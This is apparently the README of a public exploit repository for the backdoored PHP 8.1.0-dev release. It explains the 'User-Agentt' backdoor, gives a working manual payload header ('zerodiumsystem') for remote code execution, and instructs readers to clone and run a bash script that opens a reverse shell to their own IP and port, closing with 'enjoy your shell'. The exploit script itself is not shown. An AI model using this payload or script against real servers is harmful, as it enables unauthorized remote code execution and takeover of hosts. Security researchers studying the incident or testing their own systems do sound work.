# PHP-8.1.0-dev - Remote Code Execution 

## Description

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following bash exploit uses the backdoor to provide a shell on the host. A simple proof of concept file.

## Usage

You can exploit this manually by adding the 

`User-Agentt: zerodiumsystem('ls');`

header in Burp Suite or just run the script with the host IP, your own IP + port (for the reverse shell) and enjoy your shell:

`$ git clone https://github.com/PenTestical/PHP-8.1.0-dev_RCE && cd PHP-8.1.0-dev_RCE/`

`$ chmod +x exploit.sh`

`$ bash exploit.sh`
